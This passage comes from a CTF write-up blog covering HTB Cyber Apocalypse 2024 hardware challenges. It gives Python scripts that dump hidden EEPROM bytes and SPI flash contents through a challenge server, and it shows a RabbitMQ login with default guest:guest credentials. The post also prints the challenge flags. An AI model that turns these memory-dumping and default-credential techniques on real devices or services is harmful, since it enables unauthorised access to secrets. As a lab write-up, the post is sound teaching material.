</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;94.237.60.39&#39;</span><span class="p">,</span> <span class="mi">55024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">set_address_pins</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;set_address_pins(</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">)&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(cmd)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">set_ce_pin</span><span class="p">(</span><span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;set_ce_pin(</span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s1">)&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(cmd)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">set_oe_pin</span><span class="p">(</span><span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;set_oe_pin(</span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s1">)&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(cmd)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">set_we_pin</span><span class="p">(</span><span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;set_we_pin(</span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s1">)&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(cmd)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_byte</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;read_byte()&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_data</span><span class="p">(</span><span class="n">_addr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">bits</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">_addr</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span> <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">bits</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">set_address_pins</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="n">read_byte</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">val</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Setup read mode</span>
</span></span><span class="line"><span class="cl"><span class="n">set_ce_pin</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">set_oe_pin</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">set_we_pin</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">val</span> <span class="o">=</span> <span class="n">read_data</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Initially, I attempted to sequentially read data from address <code>0x000</code> to <code>0x7ff</code>. However, this method yielded no useful data, as all responses were <code>0</code>.</p>
<p>Upon a second review of the documentation, I uncovered a crucial detail suggesting the presence of additional EEPROM memory.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">DEVICE IDENTIFICATION: An extra 32 bytes of
</span></span><span class="line"><span class="cl">EEPROM memory are available to the user for device identification. By raising A9 to 12  0.5V and using address
</span></span><span class="line"><span class="cl">locations 7E0H to 7FFH the additional bytes may be written
</span></span><span class="line"><span class="cl">to or read from in the same manner as the regular memory
</span></span><span class="line"><span class="cl">array.
</span></span></code></pre></td></tr></table>
</div>
</div><p>To access this, I adjusted the script to set the <code>A9</code> pin to <code>12.5V</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_secret_data</span><span class="p">(</span><span class="n">_addr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">bits</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">_addr</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span> <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">bits</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mf">12.5</span> <span class="c1"># Set A9 to 12.5 to access extra 32 bytes data storage</span>
</span></span><span class="line"><span class="cl">    <span class="n">set_address_pins</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="n">read_byte</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">val</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x7e0</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">val</span> <span class="o">=</span> <span class="n">read_secret_data</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">bytes</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This adjustment was based on my hypothesis that the flag resided in this hidden memory section. My speculation proved accurate when the flag was successfully retrieved from this concealed storage area.</p>
<blockquote>
<p><strong>Flag: HTB{AT28C16_EEPROM_s3c23t_1d!!!}</strong></p></blockquote>
<h2 id="rids-easy">Rids [easy]</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Upon reaching the factory door, you physically open the RFID lock and find a flash memory chip inside. The chip&rsquo;s package has the word W25Q128 written on it. Your task is to uncover the secret encryption keys stored within so the team can generate valid credentials to gain access to the facility.</div>
        </div>
    </div>
<h3 id="initial-analysis-6">Initial Analysis</h3>
<p>In this challenge, we were provided with a file named <code>client.py</code>, a utility crafted by the author to facilitate interaction with the hardware in question.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exchange</span><span class="p">(</span><span class="n">hex_list</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Configure according to your setup</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;94.237.50.175&#39;</span>  <span class="c1"># The server&#39;s hostname or IP address</span>
</span></span><span class="line"><span class="cl">    <span class="n">port</span> <span class="o">=</span> <span class="mi">38795</span>        <span class="c1"># The port used by the server</span>
</span></span><span class="line"><span class="cl">    <span class="n">cs</span><span class="o">=</span><span class="mi">0</span> <span class="c1"># /CS on A*BUS3 (range: A*BUS3 to A*BUS7)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">usb_device_url</span> <span class="o">=</span> <span class="s1">&#39;ftdi://ftdi:2232h/1&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Convert hex list to strings and prepare the command data</span>
</span></span><span class="line"><span class="cl">    <span class="n">command_data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;tool&#34;</span><span class="p">:</span> <span class="s2">&#34;pyftdi&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;cs_pin&#34;</span><span class="p">:</span>  <span class="n">cs</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;url&#34;</span><span class="p">:</span>  <span class="n">usb_device_url</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;data_out&#34;</span><span class="p">:</span> <span class="p">[</span><span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">hex_list</span><span class="p">],</span>  <span class="c1"># Convert hex numbers to hex strings</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;readlen&#34;</span><span class="p">:</span> <span class="n">value</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># Serialize data to JSON and send</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">command_data</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># Receive and process response</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;]&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#print(f&#34;Received: {response}&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Example command</span>
</span></span><span class="line"><span class="cl"><span class="n">jedec_id</span> <span class="o">=</span> <span class="n">exchange</span><span class="p">([</span><span class="mh">0x9F</span><span class="p">],</span> <span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">jedec_id</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The objective appears to be reading data stored on the hardware, which is identified as a SPI flash memory model <code>W25Q128</code>.</p>
<h3 id="solution-6">Solution</h3>
<p>After searching the documentation for this specific flash memory, I found a useful <a href="https://www.pjrc.com/teensy/W25Q128FV.pdf" target="_blank" rel="noopener noreffer ">resource</a> which elaborates on its functionality. Particularly, section <code>8.2.6</code> mentions a <code>read</code> command, denoted by the instruction code <code>0x03</code>. This command allows us to specify a starting address in the form of a <code>24-bit</code> address under the <code>A23-A0</code> notation. Utilizing the provided <code>client.py</code>, we can easily configure an array of 4 bytes for this operation: the first byte for the instruction code and the subsequent three bytes for the <code>24-bit</code> address, each represented in <code>8-bit</code> segments.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">exchange</span><span class="p">([</span><span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">],</span> <span class="mi">256</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This code snippet sends the read command to the hardware, starting from address 0x000000, and reads 256 bytes of data, which contains the flag.</p>
<blockquote>
<p><strong>Flag: HTB{m3m02135_57023_53c2375_f02_3v32y0n3_70_533!@}</strong></p></blockquote>
<h2 id="bunnypass-very-easy">BunnyPass [very easy]</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">As you discovered in the PDF, the production factory of the game is revealed. This factory manufactures all the hardware devices and custom silicon chips (of common components) that The Fray uses to create sensors, drones, and various other items for the games. Upon arriving at the factory, you scan the networks and come across a RabbitMQ instance. It appears that default credentials will work.</div>
        </div>
    </div>
<h3 id="solution-7">Solution</h3>
<p>Reading through the challenge description, we know that the instance that we spawn is a <code>RabbitMQ</code> instance. Because it is stated that default credentials will work, we can login to the instance by using <code>guest:guest</code> pair.</p>
<img src="https://i.imgur.com/qfoQsC5.png"/>
<p>Then, we can check the available queues. One queue named <code>factory_idle</code> is quite interesting, so I decided to open it and check all of its messages (Click the <code>queue</code>, then click the <code>Get messages</code>).</p>
<img src="https://i.imgur.com/5itJn5w.png"/>
<p>As we can see, the last message contains the flag.</p>
<img src="https://i.imgur.com/Ft2KwA0.png"/>
<blockquote>
<p><strong>Flag: HTB{th3_hunt3d_b3c0m3s_th3_hunt3r}</strong></p></blockquote>
<h2 id="maze-very-easy">Maze [very easy]</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">In a world divided by factions, &ldquo;AM,&rdquo; a young hacker from the Phreaks, found himself falling in love with &ldquo;echo,&rdquo; a talented security researcher from the Revivalists. Despite the different backgrounds, you share a common goal: dismantling The Fray. You still remember the first interaction where you both independently hacked into The Fray&rsquo;s systems and stumbled upon the same vulnerability in a printer. Leaving behind your hacker handles, &ldquo;AM&rdquo; and &ldquo;echo,&rdquo; you connected through IRC channels and began plotting your rebellion together. Now, it&rsquo;s finally time to analyze the printer&rsquo;s filesystem. What can you find?</div>
        </div>
    </div>
<h3 id="solution-8">Solution</h3>
<p>We received a zip file, and upon extracting its contents, we discovered a PDF. Inside this PDF, we found the flag.
<img src="https://i.imgur.com/wmL0nfP.png"/></p>
<blockquote>
<p><strong>Flag: HTB{1n7323571n9_57uff_1n51d3_4_p21n732}</strong></p></blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/cyber-apocalypse-2024-blockchain-hardware/" data-title="Cyber Apocalypse 2024: Blockchain &amp; Hardware" data-via="Chovid99" data-hashtags="Writeup,Cyber Apocalypse,htb,blockchain,flash loan,hardware,spiflash,eeprom,wallet"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/cyber-apocalypse-2024-blockchain-hardware/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/cyber-apocalypse/">Cyber Apocalypse</a>,&nbsp;<a href="/tags/htb/">Htb</a>,&nbsp;<a href="/tags/blockchain/">Blockchain</a>,&nbsp;<a href="/tags/flash-loan/">Flash Loan</a>,&nbsp;<a href="/tags/hardware/">Hardware</a>,&nbsp;<a href="/tags/spiflash/">Spiflash</a>,&nbsp;<a href="/tags/eeprom/">Eeprom</a>,&nbsp;<a href="/tags/wallet/">Wallet</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/cyber-apocalypse-2024-crypto/" class="prev" rel="prev" title="Cyber Apocalypse 2024: Crypto"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Cyber Apocalypse 2024: Crypto</a>
            <a href="/posts/kalmarctf-2024/" class="next" rel="next" title="KalmarCTF 2024">KalmarCTF 2024<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
